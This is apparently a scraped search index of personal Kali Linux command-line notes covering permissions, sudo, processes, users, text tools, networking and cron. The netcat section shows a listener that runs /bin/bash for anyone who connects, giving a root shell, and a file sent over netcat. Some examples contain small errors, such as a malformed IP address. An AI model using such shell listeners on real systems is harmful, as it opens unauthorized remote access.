uid=0(root) gid=0(root) groups=0(root) User accounts are defined in the /etc/passwd file, and groups are defined in the /etc/group file. When user accounts and groups are created, these files are modified along with etc/shadow , which holds information about the user\u2019s password. For each user account, the /etc/passwd file defines the user (login) name, uid, gid, account\u2019s real name, home directory, and login shell. If we examine the contents of /etc/passwd and /etc/group , we notice that besides the regular user accounts, there are accounts for the superuser (uid 0) and various other system users. Chmod: Change File Mode use the chmod command to change the permissions of a file or a directory 1 2 3 root@kali:# chmod 600 foo.txt root@kali:# ls -l foo.txt -rw------- 1 root root 0 2018-03-06 14:52 foo.txt File Modes in Binary and Octal Octal Binary File mode 0 0 --- 1 1 --x 2 10 -w- 3 11 -wx 4 100 r-- 5 101 r-x 6 110 rw- 7 111 rwx Chmod Symbolic Notation Symbol Meaning u Short for \u201cuser\u201d but means the file or directory owner. g Group owner. o Short for \u201cothers\u201d but means world. a Short for \u201call.\u201d This is a combination of u, g, and o. chmod symbolic notation examples Notation Meaning u+x Add execute permission for the owner. u-x Remove execute permission from the owner. +x Add execute permission for the owner, group, and world. This is equivalent to a+x. o-rw Remove the read and write permissions from anyone besides the owner and group owner. go=rw Set the group owner and anyone besides the owner to have read and write permissions. If either the group owner or the world previously had execute permission, it is removed. u+x,go=rx Add execute permission for the owner and set the permissions for the group and others to read and execute. Multiple specifications may be separated by commas. Umask - Set Default Permissions The umask command controls the default permissions given to a file when it is created. It uses octal notation to express a mask of bits to be removed from a file\u2019s mode attributes. 1 2 3 4 5 6 [root@linuxbox ~]# rm -f foo.txt [root@linuxbox ~]# umask 0002 [root@linuxbox ~]# > foo.txt [root@linuxbox ~]# ls -l foo.txt -rw-rw-r-- 1 root root 0 2018-03-06 14:53 foo.txt The \"all users\" does not have write access is because of the mask (2 - binary representation 010 - r-x) Some Special Permissions setuid bit (octal 4000) When applied to an executable file, it changes the effective user ID from that of the real user (the user actually running the program) to that of the program\u2019s owner. When an ordinary user runs a program that is setuid root, the program runs with the effective privileges of the superuser. This allows the program to access files and directories that an ordinary user would normally be prohibited from accessing. syntax: chmod u+s <program> setgid bit (octal 2000) changes the effective group ID from the real group ID of the real user to that of the file owner. If the setgid bit is set on a directory, newly created files in the directory will be given the group ownership of the directory rather the group ownership of the file\u2019s creator. syntax: chmod g+s <dir> sticky bit (octal 1000) On files, Linux ignores the sticky bit, but if applied to a directory, it prevents users from deleting or renaming files unless the user is either the owner of the directory, the owner of the file, or the superuser. This is often used to control access to a shared directory, such as /tmp syntax: chmod +t <dir> to remove a sticky bit set to a directory, use syntax: chmod -t <dir> Changing Identities The sudo command allows an administrator to set up a configuration file called /etc/sudoers and define specific commands that particular users are permitted to execute under an assumed identity. If the -l option is included, the resulting shell session is a login shell for the specified user. syntax: su -l <user> to start a shell for the superuser 1 2 3 zeenotes@kali:$ su - password: root@kali:# exiting the logged in user 1 2 root@kali:# exit zeenotes@kali:$ commands can be executed using the below syntax syntax: su -c <command> Sudo: Executing a command as another user Admin can configure sudo to allow an ordinary user to execute commands as a different user sudo does not require access to superuser's password 1 2 3 root@kali:# sudo backup_script Password: System Backup Starting... To see what privileges are granted by sudo, use the -l option to list them. 1 2 3 root@kali:# sudo -l User me may run the following commands on this host: (ALL) ALL Chown: Change File Owner and Group change the owner and group owner of a file or directory super user privileges are required to use this command syntax: chown <owner>:<group> file.. Argument Results bob Changes the ownership of the file from its current owner to user bob. bob:users Changes the ownership of the file from its current owner to user bob and changes the file group owner to group users. :admins Changes the group owner to the group admins. The file owner is unchanged. bob: Changes the file owner from the current owner to user bob and changes the group owner to the login group of user bob. 1 2 3 4 5 6 7 [janet@linuxbox ~]$ sudo cp myfile.txt ~tony Password: [janet@linuxbox ~]$ sudo ls -l ~tony/myfile.txt -rw-r--r-- 1 root root root 2018-03-20 14:30 /home/tony/myfile.txt [janet@linuxbox ~]$ sudo chown tony: ~tony/myfile.txt [janet@linuxbox ~]$ sudo ls -l ~tony/myfile.txt -rw-r--r-- 1 tony tony tony 2018-03-20 14:30 /home/tony/myfile.txt we see user janet copy the file from her directory to the home directory of user tony. Next, janet changes the ownership of the file from root (a result of using sudo) to tony. chgrp: Change group ownership Adding a user to a group view group information 1 root@kali:# groups add a new group 1 2 root@kali:# groupadd new_group root@kali:# add an exisitng user to a group 1 2 root@kali:# usermod -a -G new_group user_name root@kali:# change a user's primary group 1 root@kali:# usermod -g groupname username view the groups a user account is assigned to 1 root@kali:# groups view the groups of another user 1 root@kali:# groups <user_name> create a user and assign a group in one command 1 root@kali:# useradd -G <group name> <user name> add an user to multiple groups 1 root@kali:# usermod -a -G group1,group2,group3 <user name> view all groups on the system 1 root@kali:# getent group Changing the password changing the password of other users syntax: passwd <username> changing the password of the current user syntax: passwd 1 2 3 root@kali:# passwd (current) UNIX password: New UNIX password: PROCESSES Viewing Processes 1 2 3 4 root@kali:# ps PID TTY TIME CMD 2945 pts/0 00:00:00 bash 3179 pts/0 00:00:00 ps TTY is short for \u201cteletype\u201d and refers to the controlling terminal for the process. show all processes regardless of the terminal they are controlled by 1 2 3 4 5 6 root@kali:# ps -x PID TTY STAT TIME COMMAND 1 ? Ss 0:04 /sbin/init 2 ? S 0:00 [kthreadd] 3 ? I< 0:00 [rcu_gp] 4 ? I< 0:00 [rcu_par_gp] process states State Meaning R Running. This means the process is running or ready to run. S Sleeping. The process is not running; rather, it is waiting for an event, such as a keystroke or network packet. D Uninterruptible sleep. The process is waiting for I/O such as a disk drive. T Stopped. The process has been instructed to stop. You\u2019ll learn more about this later in the chapter. Z A defunct or \u201czombie\u201d process. This is a child process that has terminated but has not been cleaned up by its parent. < A high-priority process. It\u2019s possible to grant more importance to a process, giving it more time on the CPU. This property of a process is called niceness. N A low-priority process. A process with low priority (a nice process) will get processor time only after other processes with higher priority have been serviced. viewing processes belonging to every user 1 2 3 4 5 6 root@kali:# ps aux USER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMAND root 1 0.0 0.2 104004 10068 ? Ss 08:34 0:04 /sbin/init root 2 0.0 0.0 0 0 ? S 08:34 0:00 [kthreadd] root 3 0.0 0.0 0 0 ? I< 08:34 0:00 [rcu_gp] root 4 0.0 0.0 0 0 ? I< 08:34 0:00 [rcu_par_gp] Header Meaning USER User ID. This is the owner of the process. %CPU CPU usage in percent. %MEM Memory usage in percent. VSZ Virtual memory size. RSS Resident set size. This is the amount of physical memory (RAM) the process is using in kilobytes. START Time when the process started. For values over 24 hours, a date is used. viewing processes dynamically The top program displays a continuously updating (by default, every three seconds) display of the system processes listed in order of process activity. 1 2 3 4 5 6 root@kali:# top top - 16:35:53 up 8:00, 1 user, load average: 0.15, 0.06, 0.02 Tasks: 229 total, 1 running, 228 sleeping, 0 stopped, 0 zombie %Cpu(s): 23.5 us, 5.9 sy, 0.0 ni, 70.6 id, 0.0 wa, 0.0 hi, 0.0 si, 0.0 st MiB Mem : 3924.2 total, 1864.0 free, 978.9 used, 1081.2 buff/cache MiB Swap: 4094.0 total, 4094.0 free, 0.0 used. 2616.5 avail Mem The top program accepts a number of keyboard commands. The two most interesting are h , which displays the program\u2019s help screen, and q , which quits top. Controlling Processes interrupting a process Press Ctrl + C to interrupt a program putting a process in the background 1 2 root@kali:# xlogo & [1] 3287 1 2 3 4 5 root@kali:# ps PID TTY TIME CMD 2095 pts/1 00:00:00 bash 3287 pts/1 00:00:00 xlogo 3288 pts/1 00:00:00 ps see the list of jobs using the jobs command 1 2 root@kali:# jobs [1]+ Running xlogo & returning a process to the foreground 1 root@kali:# fg %1 The fg command followed by a percent sign and the job number (called a jobspec ) stopping a process use Ctrl + Z to stop a foreground running process Signals The kill command is used to send signals to programs. syntax: kill -signal PID Number Name Meaning 1 HUP Hang up. This is a vestige of the good old days when terminals were attached to remote computers with phone lines and modems. The signal is used to indicate to programs that the controlling terminal has \u201chung up.\u201d The effect of this signal can be demonstrated by closing a terminal session. The foreground program running on the terminal will be sent the signal and will terminate. 2 INT Interrupt. This performs the same function as CTRL-C sent from the terminal. It will usually terminate a program. 9 KILL Kill. This signal is special. Whereas programs may choose to handle signals sent to them in different ways, including ignoring them all together, the KILL signal is never actually sent to the target program. Rather, the kernel immediately terminates the process. When a process is terminated in this manner, it is given no opportunity to \u201cclean up\u201d after itself or save its work. For this reason, the KILL signal should be used only as a last resort when other termination signals fail. 15 TERM Terminate. This is the default signal sent by the kill command. If a program is still \u201calive\u201d enough to receive signals, it will terminate. 18 CONT Continue. This will restore a process after a STOP or TSTP signal. This signal is sent by the bg and fg commands. 19 STOP Stop. This signal causes a process to pause without terminating. Like the KILL signal, it is not sent to the target process, and thus it cannot be ignored. 20 TSTP Terminal stop. This is the signal sent by the terminal when CTRL-Z is pressed. Unlike the STOP signal, the TSTP signal is received by the program, but the program may choose to ignore it. Processes, like files, have owners, and you must be the owner of a process (or the superuser) to send it signals with kill. other common signals Number Name Meaning 3 QUIT Quit. 11 SEGV Segmentation violation. This signal is sent if a program makes illegal use of memory; that is, if it tried to write somewhere it was not allowed to write. 28 WINCH Window change. This is the signal sent by the system when a window changes size. Some programs, such as top and less, will respond to this signal by redrawing themselves to fit the new window dimensions. display a complete list of signals 1 2 3 root@kali:# kill -l 1) SIGHUP 2) SIGINT 3) SIGQUIT 4) SIGILL 5) SIGTRAP 6) SIGABRT 7) SIGBUS 8) SIGFPE 9) SIGKILL 10) SIGUSR1 sending signals to multiple processes with killall syntax: killall [-u user] [-signal] name ... 1 2 3 root@kali:# killall xlogo [1]- Terminated xlogo [2]+ Terminated xlogo Remember, as with kill, you must have superuser privileges to send signals to processes that do not belong to you. USER ACCESS CONTROL currently logged in user 1 2 root@kali:~# whoami root adding a new user 1 root@kali:~# adduser zeenotes adding a user to the sudoers file 1 2 3 4 root@kali:~# adduser zeenotes sudo Adding user 'zeenotes' to group `sudo' ... Adding user zeenotes to group sudo Done. switching users and using sudo 1 2 3 4 5 6 7 8 9 root@kali:~# su zeenotes zeenotes@kali:/root$ zeenotes@kali:/root$ sudo adduser john [sudo] password for zeenotes:Adding user `john' ... Adding new group `john' (1002) ... Adding new user `john' (1002) with group `john' ... --snip-- zeenotes@kali:/root$ su Password:root@kali:~# FILES creating a new file 1 root@kali:~# touch myfile creating a new directory 1 root@kali:~# mkdir mydirectory Adding Text To File echo the output 1 2 root@kali:~# echo hello zeenotes hello zeenotes saving text to a file 1 root@kali:~# echo hello zeenotes > myfile view the of a file 1 root@kali:~# cat myfile echo a different line of text to the file This will overwrite the contents of the file 1 root@kali:~# echo hello zeenotes again > myfile apppending text to a file 1 root@kali:~# echo hello zeenotes second time >> myfile appending preserves the content of the file File Permissions view the permissions of the file 1 2 root@kali:~# ls -l myfile -rw-r--r-- 1 root root 47 Apr 23 21:15 myfile -rw-r--r-- file type and permissions 1 number of links to the file root user who owns the file root group that owns the file 47 file_size Apr 23 21:15 date modified myfile filename Linux permissions r - read w - write x - execute -rw- - permission for the owner -r-- - permission for the group -r-- - permission for all users change permissions on a file 1 2 3 root@kali:~# chmod 700 myfile root@kali:~# ls -l myfile -rwx------ 1 root root 47 Apr 23 21:15 myfile When entering new file permissions, you use one digit for the owner, one for the group, and one for world. Editing files 1 root@kali:~# nano myfile nano is a text editor vi is another text editor available in linux Data Manipulation Let's take a file with the following contents 1 2 3 4 5 6 7 8 root@kali:~/mydirectory# cat myfile 1 Derbycon September 2 Shmoocon January 3 Brucon September 4 Blackhat July 5 Bsides * 6 HackerHalted October 7 Hackcon April using grep grep looks for instances of a text string in a file 1 2 3 root@kali:~# grep September myfile 1 Derbycon September 3 Brucon September chaining commands send the output of grep to other command for processing using (|) pipe command using cut command 1 2 3 root@kali:~# grep September myfile | cut -d \" \" -f 2 Derbycon Brucon The cut command allows to take each line of input, choose a delimiter, and print specific fields. using sed command The sed command is ideal for editing files automatically based on certain patterns or expressions. For example, to replace all instances of the word Blackhat with Defcon in myfile 1 2 3 4 5 6 7 8 root@kali:~# sed 's/Blackhat/Defcon' myfile 1 Derbycon September 2 Shmoocon January 3 Brucon September 4 Defcon July 5 Bsides * 6 HackerHalted October 7 Hackcon April using awk for pattern matching For example, to find conferences numbered 6 or greater, use awk to search the first field for entries greater than 5 1 2 3 root@kali:~# awk '$1 >5' myfile 6 HackerHalted October 7 Hackcon April to print only the first and third words in every line 1 2 3 4 5 6 7 8 root @ kali :~ # awk '{print $1,$3;}' myfile 1 September 2 January 3 September 4 July 5 * 6 October 7 April MANAGE INSTALLED PACKAGES On Debian-based Linux distributions such as Kali Linux, use the Advanced Packaging Tool (apt) to manage packages. installing a package 1 root@kali:~# apt-get install armitage upgrading a package 1 root@kali:~# apt-get upgrade The repositories Kali uses for packages are listed in the file /etc/apt/sources.list Edit this file to add additional repositories. Run command apt-get update to refresh the database to include the new repositories PROCESSES AND SERVICES starting a service 1 2 3 root@kali:~# service apache2 start [....] Starting web server: apache2: Could not reliably determine the server's fully qualified domain name, using 127.0.1.1 for ServerName . ok stopping a service 1 root@kali:~# service apache2 stop restarting a service 1 root@kali:~# service apache2 restart Note If the command requires sudo level access, type sudo service apache2 start NETWORKING ping an ip 1 2 3 4 5 6 7 8 9 10 root@kali:~# ping 192.168.20.10 PING 192.168.20.10 (192.168.20.10) 56(84) bytes of data. 64 bytes from 192.168.20.10: icmp_req=1 ttl=64 time=0.090 ms 64 bytes from 192.168.20.10: icmp_req=2 ttl=64 time=0.029 ms 64 bytes from 192.168.20.10: icmp_req=3 ttl=64 time=0.038 ms 64 bytes from 192.168.20.10: icmp_req=4 ttl=64 time=0.050 ms **^C** --- 192.168.20.10 ping statistics --- 4 packets transmitted, 4 received, 0% packet loss, time 2999 ms rtt min/avg/max/mdev = 0.029/0.051/0.090/0.024 ms view network information ifconfig command 1 2 3 4 5 6 7 8 9 10 root@kali:~# ifconfig eth0\u2776 Link encap:Ethernet HWaddr 00:0c:29:df:7e:4d inet addr:192.168.20.9\u2777 Bcast:192.168.20.255 Mask:255.255.255.0\u2778 inet6 addr: fe80::20c:29ff:fedf:7e4d/64 Scope:Link UP BROADCAST RUNNING MULTICAST MTU:1500 Metric:1 RX packets:1756332 errors:930193 dropped:17 overruns:0 frame:0 TX packets:1115419 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:1000 RX bytes:1048617759 (1000.0 MiB) TX bytes:115091335 (109.7 MiB) Interrupt:19 Base address:0x2024 eth0 - network interface inet addr: 192.168.20.9 - ip address Mask: 255.255.255.0 - Network Mask The address\u2019s network mask, or netmask (Mask), at \u2778 identifies which parts of the IP address are part of the network and which parts belong to the host. The default gateway is where the host routes traffic to other networks. Any traffic destined outside the local network will be sent to the default gateway for it to figure out where it needs to go. setting a static ip address Network connection uses the DHCP (Dynamic Host Configuration Protocol) protocol to pull IP address from the network. Edit the file /etc/network/interfaces to change the IP address contents of the /etc/network/interfaces file 1 2 3 4 5 6 # This file describes the network interfaces available on your system # and how to activate them. For more information, see interfaces(5). # The loopback network interface auto lo iface lo inet loopback 1 2 3 4 5 6 7 8 9 10 11 # This file describes the network interfaces available on your system # and how to activate them. For more information, see interfaces(5). # The loopback network interface auto lo iface lo inet loopback auto eth0 iface eth0 inet static \u2776 address 192.168.20.9 netmask 255.255.255.0 \u2777 gateway 192.168.20.1 \u2778 once the above file is edited, restart networking restart networking 1 root@kali:~# service networking restart viewing network connections To view network connections, listening ports etc, netstat command may be used 1 2 3 4 root@kali:~# netstat -antp Active Internet connections (servers and established) Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp6 0 0 :::80 :::* LISTEN 15090/apache2 Netcat view help of netcat 1 2 3 4 5 6 7 8 9 root@kali:~# nc -h [v1.10-40] connect to somewhere: nc [-options] hostname port[s] [ports] ... listen for inbound: nc -l -p port [-options] [hostname] [port] options: -c shell commands as `-e'; use /bin/sh to exec [dangerous!!] -e filename program to exec after connect [dangerous!!] -b allow broadcasts --snip-- check if a port is listening 1 2 root@kali:~# nc -v 192.168.20.9 80 (UNKNOWN) [192.168.20.10] 80 (http) open other option could be 1 2 3 4 5 6 7 8 root@kali:~# nc -vv 192.168.20.10 25 nc: 192.168.20.10 (192.168.20.10) 25 [smtp]\u2776 open nc: using stream socket nc: using buffer size 8192 nc: read 66 bytes from remote 220 bookxp SMTP Server SLmail 5.5.0.4433 Ready ESMTP spoken here nc: wrote 66 bytes to local listen on a port for an incoming connection 1 2 root@kali:~# nc -lvp 1234 listening on [any] 1234 ... l - listen v - verbose p - port open a second terminal and use netcat to connect to the netcat listener 1 2 root@kali:~# nc 192.192.168.20.9 1234 hi zeenotes Once the connection is established, the text appears on the listener 1 2 3 listening on [any] 1234 ... connect to [192.168.20.9] from (UNKNOWN) [192.168.20.9] 51917 hi zeenotes use Ctrl + C to close netcat processes open a command shell listener using netcat use the -e flag to tell netcat to execute /bin/bash when a connection is received 1 2 root@kali:~# nc -lvp 1234 -e /bin/bash listening on [any] 1234 ... Use a second terminal to connect to a netcat listener 1 2 3 root@kali:~# nc 192.192.168.20.9 1234 whoami root output what comes to the listener to the screen send file contents across with netcat first terminal 1 2 root@kali:~# nc -lvp 1234 > netcatfile listening on [any] 1234 ... second terminal use the < symbol to send the contents of a file 1 root@kali:~# nc 192.168.20.9 1234 < mydirectory/myfile Automating tasks with Cron job cron command allows to schedule tasks to automatically run at a specified time cron related files are present in the /etc directory 1 2 3 4 5 6 7 root@kali:/etc# ls | grep cron cron.d cron.daily cron.hourly cron.monthly crontab cron.weekly The cron.daily , cron.hourly , cron.monthly , and cron.weekly directories specify scripts that will run automatically, every day, every hour, every month, or every week, depending on which directory you put your script in. cron's configuration file is /etc/crontab 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 \\# /etc/crontab: system-wide crontab \\# Unlike any other crontab you don't have to run the `crontab' \\# command to install the new version when you edit this file \\# and files in /etc/cron.d. These files also have username fields, \\# that none of the other crontabs do. SHELL=/bin/sh PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin \\# m h dom mon dow user command 17 * * * * root cd / && run-parts --report /etc/cron.hourly \u2776 25 6 * * * root test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily ) \u2777 47 6 * * 7 root test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly ) 52 6 1 * * root test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly ) \\#","title":"Linux Command Line"},{"location":"linux/linux_cmd/#the_linux_command_line","text":"","title":"The Linux Command Line"},{"location":"linux/linux_cmd/#basics","text":"","title":"Basics"},{"location":"linux/linux_cmd/#navigation","text":"","title":"NAVIGATION"},{"location":"linux/linux_cmd/#view_the_files_of_a_folder","text":"1 2 root@kali:~# ls Desktop","title":"View the files of a folder"},{"location":"linux/linux_cmd/#view_all_the_files_including_the_hidden_directories","text":"1 root@kali:~# ls -a","title":"view all the files including the hidden directories"},{"location":"linux/linux_cmd/#listing_a_directory","text":"1 root@kali:~# ls /usr","title":"listing a directory"},{"location":"linux/linux_cmd/#listing_a_directory_with_more_details","text":"1 root@kali:~# ls -l","title":"listing a directory with more details"},{"location":"linux/linux_cmd/#listing_a_directory_and_sort_the_result","text":"1 root@kali:~# ls -lt","title":"listing a directory and sort the result"},{"location":"linux/linux_cmd/#listing_a_directory_and_reverse_sorting_the_result","text":"1 root@kali:~# ls -lt --reverse","title":"listing a directory and reverse sorting the result"},{"location":"linux/linux_cmd/#see_the_current_directory","text":"1 2 root@kali:~# pwd /root","title":"see the current directory"},{"location":"linux/linux_cmd/#changing_the_directory","text":"1 2 3 root@kali:~/Desktop# cd .. root@kali:~/# cd ../etc root@kali:/etc# Note cd - changes the working directory to the previous working directory cd ~username - changes the working directory to the home directory of the user_name","title":"changing the directory"},{"location":"linux/linux_cmd/#help","text":"1 root@kali:~# man ls","title":"help"},{"location":"linux/linux_cmd/#file_and_navigation_summary","text":"Option Long option Description -a --all List all files, even those with names that begin with a period, which are normally not listed (that is, hidden). -A --almost-all Like the -a option except it does not list . (current directory) and ..(parent directory). -d --directory Ordinarily, if a directory is specified, ls will list the contents of the directory, not the directory itself. Use this option in conjunction with the -l option to see details about the directory rather than its contents. -F --classify This option will append an indicator character to the end of each listed name. For example, it will append a forward slash (/) if the name is a directory. -h --human-readable In long format listings, display file sizes in human-readable format rather than in bytes. -l Display results in long format. -r --reverse Display the results in reverse order. Normally, ls displays its results in ascending alphabetical order. -S Sort results by file size. -t Sort by modification time. ---","title":"File and Navigation Summary"},{"location":"linux/linux_cmd/#exploring_files","text":"","title":"EXPLORING FILES"},{"location":"linux/linux_cmd/#determining_a_files_type","text":"syntax: file _filename_ 1 2 root@kali:~# file bookudp.xml bookudp.xml: XML 1.0 document, ASCII text, with very long lines","title":"Determining a file's type"},{"location":"linux/linux_cmd/#viewing_file_contents_with_less","text":"less command is used to view file contents syntax: less _filename_ 1 2 3 root@kali:~# less /etc/passwd root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin","title":"Viewing File Contents With Less"},{"location":"linux/linux_cmd/#manipulating_files_and_directories","text":"","title":"MANIPULATING FILES AND DIRECTORIES"},{"location":"linux/linux_cmd/#wildcards","text":"Wildcards are special characters to help rapidly specify groups of filenames. Wildcard Meaning * Matches any characters ? Matches any single character [characters] Matches any character that is a member of the set characters [!characters] Matches any character that is not a member of the set characters [[:class:]] Matches any character that is a member of the specified class","title":"Wildcards"},{"location":"linux/linux_cmd/#commonly_used_character_classes","text":"Character class Meaning [:alnum:] Matches any alphanumeric character [:alpha:] Matches any alphabetic character [:digit:] Matches any numeral [:lower:] Matches any lowercase letter [:upper:] Matches any uppercase letter","title":"Commonly Used Character Classes"},{"location":"linux/linux_cmd/#wildcard_examples","text":"Pattern Matches * All files g* Any file beginning with g b*.txt Any file beginning with b followed by any characters and ending with .txt Data??? Any file beginning with Data followed by exactly three characters [abc]* Any file beginning with either an a, a b, or a c BACKUP.[0-9][0-9][0-9] Any file beginning with BACKUP. followed by exactly three numerals [[:upper:]]* Any file beginning with an uppercase letter [![:digit:]]* Any file not beginning with a numeral *[[:lower:]123] Any file ending with a lowercase letter or the numerals 1, 2, or 3","title":"Wildcard Examples"},{"location":"linux/linux_cmd/#file_manipulation","text":"","title":"File Manipulation"},{"location":"linux/linux_cmd/#copy_files_and_directories","text":"1 cp item1 item2 copies the single file or directory item1 to the file or directory item2 1 cp item... directory copies multiple items (either files or directories) into a directory","title":"Copy Files and Directories"},{"location":"linux/linux_cmd/#move_files_and_directories","text":"1 mv item1 item2 move or rename the file or directory item1 to item2 1 mv _item..._ _directory_ move one or more items from one directory to another.","title":"Move Files and Directories"},{"location":"linux/linux_cmd/#remove_files_and_directories","text":"the rm command is used to remove (delete) files and directories 1 root@kali:~# rm item","title":"Remove Files and Directories"},{"location":"linux/linux_cmd/#hard_link_and_symbolic_links","text":"ln command is used to create either hard or symbolic links. The following creates a hard link syntax: ln file link The following creates a symbolic link syntax: ln -s item link","title":"Hard link and Symbolic Links"},{"location":"linux/linux_cmd/#working_with_commands","text":"linux allows us to create our own commands A command can be one of the four following things An executable program - e.g. programs in /usr/bin A Shell builtin - e.g. cd A Shell function - e.g. shell scripts An Alias - e.g command defined by the user","title":"WORKING WITH COMMANDS"},{"location":"linux/linux_cmd/#identifying_commands","text":"","title":"Identifying Commands"},{"location":"linux/linux_cmd/#getting_a_commands_documentation","text":"","title":"Getting a command's documentation"},{"location":"linux/linux_cmd/#creating_own_commands_with_alias","text":"It\u2019s possible to put more than one command on a line by separating each command with a semicolon. syntax: command1; command2; command3 alias syntax syntax: alias <aliasname>=<string> 1 root @ kali : # alias foo = 'cd /usr; ls; cd -' using the alias 1 2 3 root@kali:~# foo bin games include lib local sbin share src /home/me removing the alias 1 root@kali:# unalias foo view all aliases 1 2 3 4 root@kali:# alias alias l.='ls -d .* --color=tty' alias ll='ls -l --color=tty' alias ls='ls --color=tty'","title":"Creating Own Commands With Alias"},{"location":"linux/linux_cmd/#io_redirection","text":"The \u201cI/O\u201d stands for input/output, and with this facility you can redirect the input and output of commands","title":"I/O REDIRECTION"},{"location":"linux/linux_cmd/#redirecting_standard_output","text":"syntax: <command> > <filename> 1 root@kali:# ls -l /usr/bin > ls-output.txt error get written to the screen and not the file 1 2 root@kali:# ls -l /bin/usr > ls-output.txt ls: cannot access /bin/usr: No such file or directory other way to create a file 1 root@kali:# > ls-output.txt Simply using the redirection operator with no command preceding it will truncate an existing file or create a new, empty file. append redirected output instead of overwriting a file 1 root@kali:# ls -l /usr/bin >> ls-output.txt Using the >> operator will result in the output being appended to the file.","title":"Redirecting Standard Output"},{"location":"linux/linux_cmd/#redirecting_standard_error","text":"root@kali:# ls -l /bin/usr 2> ls-error.txt The file descriptor 2 is placed immediately before the redirection operator to perform the redirection of standard error to the file ls-error.txt .","title":"Redirecting Standard Error"},{"location":"linux/linux_cmd/#redirecting_standard_output_and_standard_error_to_one_file","text":"1 root@kali:# ls -l /bin/usr > ls-output.txt 2>&1 First we redirect standard output to the file ls-output.txt , and then we redirect file descriptor 2 (standard error) to file descriptor 1 (standard output) using the notation 2>&1. Order of the Redirections Matter If the order is changed to the following, then standard error is directed to the screen 2>&1 >ls-output.txt","title":"Redirecting Standard Output and Standard Error to One File"},{"location":"linux/linux_cmd/#modern_versions_of_redirection","text":"1 root@kali:~# ls -l /bin/usr &> ls-output.txt appending standard output and standard error streams to a single file 1 root@kali:~# ls -l /bin/usr &>> ls-output.txt","title":"Modern Versions of Redirection"},{"location":"linux/linux_cmd/#disposing_unwanted_output","text":"1 root@kali:# ls -l /bin/usr 2> /dev/null Output is sent to a special file called /dev/null . This file is a system device often referred to as a bit bucket , which accepts input and does nothing with it.","title":"Disposing Unwanted Output"},{"location":"linux/linux_cmd/#redirecting_standard_input","text":"","title":"Redirecting Standard Input"},{"location":"linux/linux_cmd/#cat_-_concatenate_files","text":"syntax: cat <filename> multiple filenames can be joined to one single file syntax: cat filenames > <new file name> e.g. there are multiple filenames like this filename1, filename2, filename3 etc, the same can be concatenated to a single filename with the following command 1 cat filename* > filename","title":"Cat - Concatenate Files"},{"location":"linux/linux_cmd/#pipelines","text":"syntax: command 1 | command 2 1 root@kali:# ls -l /usr/bin | less","title":"PIPELINES"},{"location":"linux/linux_cmd/#filters","text":"Pipelines are often used to perform complex operations on data. It is possible to put several commands together into a pipeline. Frequently, the commands used this way are referred to as filters .","title":"Filters"},{"location":"linux/linux_cmd/#sort_-_sorting_lines","text":"1 root@kali:# ls /bin /usr/bin | sort | less","title":"Sort - Sorting Lines"},{"location":"linux/linux_cmd/#uniq_-_report_or_omit_repeated_lines","text":"1 root@kali:# ls /bin /usr/bin | sort | uniq | less In this example, we use uniq to remove any duplicates from the output of the sort command. If we want to see the list of duplicates instead, we add the -d option to uniq like so 1 root@kali:# ls /bin /usr/bin | sort | uniq -d | less","title":"Uniq - Report or Omit Repeated Lines"},{"location":"linux/linux_cmd/#wc_-_print_line_word_and_byte_counts","text":"The wc (word count) command is used to display the number of lines, words, and bytes contained in files. 1 2 root@kali:# wc ls-output.txt 7902 64566 503634 ls-output.txt to see the number of items in a sorted list, the following command can be used 1 2 root@kali:# ls /bin /usr/bin | sort | uniq | wc -l 2500","title":"WC - Print Line, Word and Byte Counts"},{"location":"linux/linux_cmd/#grep_-_print_lines_matching_a_pattern","text":"syntax: grep <pattern> <filename> 1 2 3 4 5 6 7 8 9 10 11 12 root@kali:# ls /bin /usr/bin | sort | uniq | grep zip bunzip2 bzip2 gunzip gzip unzip zip zipcloak zipgrep zipinfo zipnote zipsplit grep flags -i for ignoring the case when performing the search -v for grep to print only the lines that do not match the pattern","title":"Grep - Print Lines Matching A Pattern"},{"location":"linux/linux_cmd/#headtail_-_print_firstlast_part_of_files","text":"The head command prints the first 10 lines of a file, and the tail command prints the last 10 lines. By default, both commands print 10 lines of text, but this can be adjusted with the -n option. syntax: head <no of lines><filename> 1 2 3 4 5 6 root@kali:# head -n 5 ls-output.txt total 343496 -rwxr-xr-x 1 root root 31316 2017-12-05 08:58 [ -rwxr-xr-x 1 root root 8240 2017-12-09 13:39 411toppm -rwxr-xr-x 1 root root 111276 2017-11-26 14:27 a2p -rwxr-xr-x 1 root root 25368 2016-10-06 20:16 a52dec syntax: tail <no of lines><filename> 1 2 3 4 5 6 root@kali:# tail -n 5 ls-output.txt -rwxr-xr-x 1 root root 5234 2017-06-27 10:56 znew -rwxr-xr-x 1 root root 691 2015-09-10 04:21 zonetab2pot.py -rw-r--r-- 1 root root 930 2017-11-01 12:23 zonetab2pot.pyc -rw-r--r-- 1 root root 930 2017-11-01 12:23 zonetab2pot.pyo lrwxrwxrwx 1 root root 6 2016-01-31 05:22 zsoelim -> soelim can be used in pipelines 1 2 3 4 5 6 root@kali:# ls /usr/bin | tail -n 5 znew zonetab2pot.py zonetab2pot.pyc zonetab2pot.pyo zsoelim viewing files in real time using tail tail has an option that allows you to view files in real time. This is useful for watching the progress of log files as they are being written. 1 2 3 4 root@kali:# tail -f /var/log/messages Feb 8 13:40:05 twin4 dhclient: DHCPACK from 192.168.1.1 Feb 8 13:40:05 twin4 dhclient: bound to 192.168.1.4 -- renewal in 1652 seconds. Feb 8 13:55:32 twin4 mountd[3953]: /var/NFSv4/musicbox exported to both 192.168.1.0/24 and Using the -f option, tail continues to monitor the file, and when new lines are appended, they immediately appear on the display. This continues until you type CTRL-C .","title":"head/tail - Print First/Last Part of Files"},{"location":"linux/linux_cmd/#tee_-_read_from_stdin_and_output_to_stdout_and_files","text":"The tee command reads standard input and copies it to both standard output (allowing the data to continue down the pipeline) and to one or more files. 1 2 3 4 5 root@kali:# ls /usr/bin | tee ls.txt | grep zip bunzip2 bzip2 gunzip gzip tee captures the entire directory listing to the file ls.txt before grep filters the pipeline\u2019s contents","title":"Tee - Read from Stdin and 